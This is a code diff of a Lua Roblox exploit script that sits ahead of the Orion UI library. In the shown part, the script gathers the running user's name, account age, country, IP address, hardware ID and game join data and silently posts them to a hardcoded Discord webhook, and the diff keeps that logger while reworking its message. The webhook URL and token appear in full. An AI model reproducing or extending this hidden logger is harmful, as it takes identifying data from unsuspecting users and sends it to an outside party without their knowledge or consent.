@@ -688,11 +688,12 @@ local function createWebhookData()
                     "\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                     "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
-                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```" ..
+                    "\n\n**Join Link:** [Click Here](%s)",
                     Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                     tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                     game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
-                    GetData, ConsoleJobId
+                    GetData, ConsoleJobId, JoinLink
                 ),
                 ["type"] = "rich",
                 ["color"] = tonumber("0xFFD700"),
@@ -714,15 +715,12 @@ local function sendWebhook(webhookUrl, data)
     local request = http_request or request or HttpPost or syn.request
     local embedRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
     request(embedRequest)
-
-    local joinLinkData = HttpService:JSONEncode({["content"] = JoinLink})
-    local joinRequest = {Url = webhookUrl, Body = joinLinkData, Method = "POST", Headers = headers}
-    request(joinRequest)
 end
 
 local webhookUrl = "https://discord.com/api/webhooks/1341206231557341235/2kKEkIDA5OPR6bpMBJAO6hG_icxjGDfWF36bc_EsW65UoevsyKaTODzyvX1su2b_rl1U"
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
+
 function OrionLib:MakeWindow(WindowConfig)
 	local FirstTab = true
 	local Minimized = false
